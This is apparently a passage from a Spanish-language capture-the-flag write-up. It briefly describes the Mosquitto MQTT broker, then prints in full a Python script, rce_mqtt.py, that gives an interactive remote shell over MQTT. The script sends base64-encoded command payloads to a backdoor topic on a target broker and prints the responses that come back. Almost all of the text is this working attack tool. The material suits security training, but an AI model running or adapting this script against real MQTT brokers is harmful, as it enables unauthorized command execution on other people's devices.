Ahora bien, investiguemos que es ese servicio llamado Mosquito:

“Mosquitto es un servidor (o bróker) de mensajes de código abierto que implementa el protocolo MQTT. Actúa como un intermediario que permite a diferentes dispositivos y aplicaciones (publicadores y suscriptores) comunicarse entre sí de manera eficiente, especialmente útil en el Internet de las Cosas (IoT) debido a la ligereza del protocolo MQTT. Mosquitto facilita la transmisión de mensajes en un modelo de publicación/suscripción (pub/sub), donde los publicadores envían mensajes a temas y los suscriptores reciben esos mensajes de los temas a los que se han suscrito.” - Geminis AI

rce_mqtt.py

#!/usr/bin/env python3
import subprocess
import base64
import json
import time
import threading

# Colors
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Colores de texto
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Colores de fondo
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

# Configuración
broker_host = "10.201.26.45"
topic_sub = "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
topic_pub = "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
command_id = "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"

def send_command(command):
    payload = {
        "id": command_id,
        "cmd": "CMD",
        "arg": command
    }
    encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode()
    
    cmd = f"mosquitto_pub -h {broker_host} -t '{topic_pub}' -m '{encoded_payload}'"
    
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{Colors.YELLOW}[+] {Colors.GREEN}Comando enviado{Colors.RESET}: {command}")

def listen_responses():
    while True:
        try:
            cmd = f"mosquitto_sub -h {broker_host} -t '{topic_sub}' -C 1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.stdout:
                response = result.stdout.strip()
                try:
                    decoded = base64.b64decode(response).decode('utf-8', errors='ignore')
                    data = json.loads(decoded)
                    print(f"\n{Colors.YELLOW}[+] {Colors.GREEN}Respuesta{Colors.RESET}:\n{data['response']}")
                except:
                    print(f"\n{Colors.YELLOW}[!] {Colors.RED}Respuesta cruda{Colors.RESET}: {response}")
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            print(e)
        time.sleep(0.1)


if __name__ == "__main__":
    print(f"{Colors.CYAN}Shell interactiva MQTT {Colors.RESET}(escribe 'exit' para salir)")
    print("=" * 50)
    
    listener = threading.Thread(target=listen_responses, daemon=True)
    listener.start()
    
    time.sleep(1)

    while True:
        try:
            cmd = input("$ ").strip()
            if cmd.lower() == 'exit':
                break
            if cmd:
                send_command(cmd)
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n[!] Saliendo...")
            break

    print("[+] Sesión finalizada")
